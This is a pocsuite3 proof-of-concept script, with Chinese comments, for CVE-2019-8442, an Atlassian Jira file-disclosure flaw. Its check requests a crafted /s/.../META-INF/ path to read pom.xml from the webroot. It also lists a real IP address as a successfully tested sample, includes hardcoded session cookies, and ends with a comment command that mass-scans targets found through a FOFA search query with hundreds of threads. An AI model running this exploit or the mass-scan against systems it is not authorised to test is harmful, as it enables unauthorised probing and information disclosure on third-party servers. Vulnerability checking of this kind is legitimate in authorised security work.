from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class XXLJOBPOC(POCBase):
    vulID = "CVE-2019-8442"#漏洞描述  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "XZ"  # PoC作者的大名
    vulDate = "2022-7-14"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-14"  # 编写 PoC 的日期
    updateDate = "2022-7-14"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/webapp/AtlassianJira"]  # 漏洞地址来源,0day不用写
    name = "Atlassian Jira com.atlassian.jira 敏感信息泄漏 CVE-2019-8442"  # PoC 名称
    appPowerLink = "http://wiki.peiqi.tech/wiki/webapp/AtlassianJira"  # 漏洞厂商主页地址
    appName = "Atlassian Jira com.atlassian.jira 敏感信息泄漏 CVE-2019-8442"  # 漏洞应用名称
    appVersion = "Atlassian Jira < 7.13.4   Atlassian Jira 8.00-8.0.4    Atlassian Jira 8.1.0-8.1.1"  # 漏洞影响版本
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ["http://114.115.173.5:8081"]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
              Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 远程攻击者可利用该漏洞访问Jira webroot中的文件

           """  # 漏洞简要描述
    pocDesc = """
               /s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml

           """  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        full_url = f"{self.url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml"
        cookies = {"atlassian.xsrf.token": "BK3V-YWUM-VXOV-FABM_092a881425d83c7a5b57029a1152693e803f7e6d_lout",
                         "JSESSIONID": "A365A2B0532B99CC6B44A98CC3782459"}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "Connection": "close", "Upgrade-Insecure-Requests": "1"}
        try:
            response = requests.get(full_url, headers=headers, cookies=cookies,allow_redirects=False, verify=False, timeout=5)
            # 判断是否存在漏洞
            if "<modelVersion>" in response.text:
                result.append(self.url)
        except Exception as e:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(XXLJOBPOC)
#pocsuite -r ./pocs/4Atlassian.py --dork-fofa  "app=""ATLASSIAN-JIRA""" --max-size 500 --save-file ./4Atlassian.txt --threads 505